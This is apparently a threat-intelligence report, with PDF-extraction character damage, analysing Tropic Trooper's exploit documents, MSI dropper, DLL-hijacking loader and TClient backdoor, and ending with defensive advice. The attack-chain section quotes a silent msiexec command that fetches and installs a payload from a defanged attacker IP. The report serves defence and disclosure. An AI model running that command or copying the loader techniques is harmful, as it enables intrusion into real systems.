Tropic Trooper (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine, andHong Kong targets, focusing on their government, healthcare, transportation, and high-techindustries. Its operators are believed to be very organized and develop their own cyberespionagetools that they .ne-tuned in their recent campaigns. Many of the tools they use now feature newbehaviors, including a change in the way they maintain a foothold in the targeted network. 
Attack Chain 
Figure 1. Attack chain of Tropic Trooper¡¯s operations 
Here¡¯s a summary of the attack chain of Tropic Trooper¡¯s recent campaigns: 
1. 
Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security .aws inMicrosoft Of.ce¡¯s Equation Editor (EQNEDT32.EXE). 

2. 
Download an installer package (.msi) and install it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]). 

3. 
This system con.guration .le (in.sys) will drop a backdoor installer (UserInstall.exe) then deleteitself. The backdoor installer will drop a normal sidebar.exe .le (a Windows Gadget tool, a feature already discontinued by Windows), a malicious loader (in¡°C:\ProgramData\Apple\Update\wab32res.dll¡°), and an encrypted con.guration .le.UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launchsidebar.exe. 

4. 
The malicious loader will use dynamic-link library (DLL) hijacking ¡ª injecting malicious codeinto a process of a .le/application ¡ª on sidebar.exe and launch dllhost.exe (a normal .le). Theloader will then inject a DLL backdoor into dllhost.exe. We also observed malicious documents that don¡¯t need to download anything from the internet asthe backdoor¡¯s dropper is already embedded in the document. This, however, doesn¡¯t in.uence theoverall result for the victim. 


The backdoor will load the encrypted con.guration .le and decrypt it, then use Secure SocketsLayer (SSL) protocol to connect to command-and-control (C&C) servers.

Latest Ransomware Posts Tropic Trooper uses exploit-laden Microsoft Of.ce documents to deliver malware to targets. Thesedocuments use job vacancies in organizations that may be deemed socio-politically sensitive torecipients. Below is a screenshot of the document used in their latest campaigns: 



Figure 2. Malicious document used by Tropic TrooperPDB Strings as Context Clues
The MSI .le has two program database (PDB) strings inside: one belonging to the MSI .le, andanother for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). 
Figure 3. PDB strings inside the MSI .leThe .rst PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which wefound to be an open-source application that converts executable setup programs to MSI .les. Thesecond PDB string contains Work, House, and TSSL: we can assume this tool belongs to TropicTrooper¡¯s TSSL project as seen by other researchers. Here it is a new one, as seen in theirmisspelling of ¡°Horse¡± to ¡°House¡± (other reports had the string typed correctly). 
Another interesting PDB string we found isD:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI .le drops three .les and creates one hidden directory (UFile) intoC:\ProgramData\Apple\Update\, likely as a ruse. 
It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) throughDLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign .le. 
Figure 4. The installer drops three .les into the Apple/Update directory 
Figure 5. PDB strings inside the loader .le 
From the PDB string above, the attackers intended it to be a loader (hence the name FakeRun) andnot the actual backdoor. FakeRun¡¯s PDB string(D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL .le, which is the backdoor, into this process. Thebackdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string.

Malware Analysis
wab32res.dll (FakeRun loader) loads TClient. Once the loader is executed, it will check the currentprocess (sidebar.exe) whether to load it or not. Successfully checking the loader will execute thedllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet 
Information Services.

Figure 8. The malicious loader injecting the backdoor into dllhost.exe 
Figure 9. Comparison of TClient¡¯s con.guration format in 2016 (left, from other researchers) and 
2018 (right) 
TClient will use SSL to connect to Tropic Trooper¡¯s C&C server. However, the C&C server andsome con.guration values are not hardcoded in the backdoor. This allows Tropic Trooper¡¯soperators to easily change/update the C&C server and con.gure other values. 
TClient is actually one of Tropic Trooper¡¯s other backdoors. The backdoor noted by other securityresearchers was encoded with different algorithms and con.gured with different parameter namesin 2016, for instance. TClient uses symmetric encryption to decrypt its con.guration with one 16-byte key in 2018.

Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClientwill use custom SSL libraries to connect the C&C server. We also found another SSL certi.cate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire aftera year, suggesting Tropic Trooper¡¯s use or abuse of components or services that elapse so they canleave as few traces as possible.

We further monitored their activities and found three additional and notable PDB strings in theirmalware: 

D:\Work\Project\VS\HSSL\HSSL_Unicode _2\Release\ServiceClient.pdbD:\Work\VS\Horse\TSSL\TSSL_v3.0\TClient\Release\TClient.pdbD:\Work\VS\Horse\TSSL\TSSL_v0.3.1_20170722\TClient\x64\Release\TClient.pdbThese came from open-intelligence platforms and incident response cases. These strings shedfurther light on Tropic Trooper¡¯s operations: 



They
 have another campaign/project named HSSL, which supports Unicode characters.


The
 TSSL project has a v3.0 version, indicating the operators can mix and match different versionsof their malware, depending on their target.


The
 TSSL project has 64-bit version.


The Need for a Proactive Incident Response Strategy
Cyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to exploitweaknesses in people and technology. For organizations, this highlights the signi.cance of stayingahead of their attackers: detect, analyze, and respond. What techniques will they use? How can myorganization¡¯s attack surface be reduced? What did I do to respond to the threat ¡ª what worked,what didn¡¯t, and what could be .ne-tuned? 
A proactive incident response strategy provides threat intelligence ¡ª from the endpoint to thenetwork ¡ª that can let IT/system administrators identify malicious activities that aren¡¯t typicallyvisible to traditional security solutions. 
TClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others. Itsuse of the SSL protocol also means it can blend with legitimate traf.c. Analyzing their PDB stringscan also provide a deeper insight into the campaign¡¯s bigger picture. Ascertaining the tactics andtechniques they use empower organizations in developing robust and actionable indicators ofcompromise (IoCs) that can act as benchmarks for response. 
Here are some best practices that organizations can adopt: 

Keep
 the system, its applications, and the network updated. The vulnerabilities that TropicTrooper¡¯s campaigns have been patched last January, for instance. Enforce a stronger patch 
management policy, and consider virtual patching for legacy systems.


Enforce
 the principle of least privilege: Employ network segmentation and data categorization to deter lateral movement and mitigate further exposure. Application control and behavior monitoringblock suspicious .les and anomalous routines from being installed or executed in the system.


Disable
 or secure the use of system administration tools such as PowerShell and other command-line tools that may be abused.


Actively
 monitor your perimeter, from gateways and endpoints to networks and servers. Firewalls 
as well as intrusion detection and prevention systems help thwart network-based attacks.


Nurture
 a culture of cybersecurity. Spear-phishing emails, for instance, rely on baiting targets withsocially engineered documents. The technologies that help protect the organization are only as goodas the people who use them.
